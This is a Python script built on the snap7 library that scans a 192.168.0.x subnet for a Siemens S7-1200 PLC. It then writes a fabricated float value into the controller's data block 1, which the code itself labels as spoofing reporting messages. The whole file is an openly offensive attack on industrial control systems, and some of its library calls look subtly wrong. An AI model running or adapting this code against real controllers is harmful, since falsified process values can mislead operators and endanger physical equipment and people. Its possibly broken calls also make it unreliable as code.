import snap7
import socket
from snap7.util import *
from snap7.types import *

def discover_plc_ip():
    """
    Discover the IP address of the Siemens S7-1200 PLC on the network.
    This is a simple implementation and may need to be adjusted based on your network setup.
    """
    # Replace with the expected PLC IP range or use a more sophisticated discovery method
    ip_range = "192.168.0."
    for i in range(1, 255):
        ip = ip_range + str(i)
        try:
            client = snap7.client.Client()
            client.connect(ip, 0, 1)  # Rack 0, Slot 1 for S7-1200
            if client.get_connected():
                print(f"PLC found at IP: {ip}")
                client.destroy()
                return ip
        except Exception as e:
            pass
    print("PLC not found on the network.")
    return None

def spoof_reporting_message(plc_ip):
    """
    Spoof reporting messages by writing fake I/O values to the PLC.
    """
    try:
        # Create a client and connect to the PLC
        client = snap7.client.Client()
        client.connect(plc_ip, 0, 1)  # Rack 0, Slot 1 for S7-1200

        if not client.get_connected():
            print("Failed to connect to the PLC.")
            return

        # Define the memory area and offset to write fake data
        area = S7AreaDB  # Data Block area
        db_number = 1    # Data Block number
        start_offset = 0 # Start offset in the Data Block
        data_length = 4   # Length of data to write (4 bytes for a float)

        # Generate fake I/O value (e.g., a float value)
        fake_value = 123.45
        fake_data = snap7.util.float_to_bytes(fake_value)

        # Write the fake data to the PLC
        client.write_area(area, db_number, start_offset, fake_data)
        print(f"Successfully wrote fake I/O value {fake_value} to the PLC.")

    except Exception as e:
        print(f"Error while spoofing reporting message: {e}")
    finally:
        if client.get_connected():
            client.disconnect()
            client.destroy()

if __name__ == "__main__":
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    
    if plc_ip:
        # Spoof reporting messages
        spoof_reporting_message(plc_ip)
    else:
        print("Cannot proceed without the PLC's IP address.")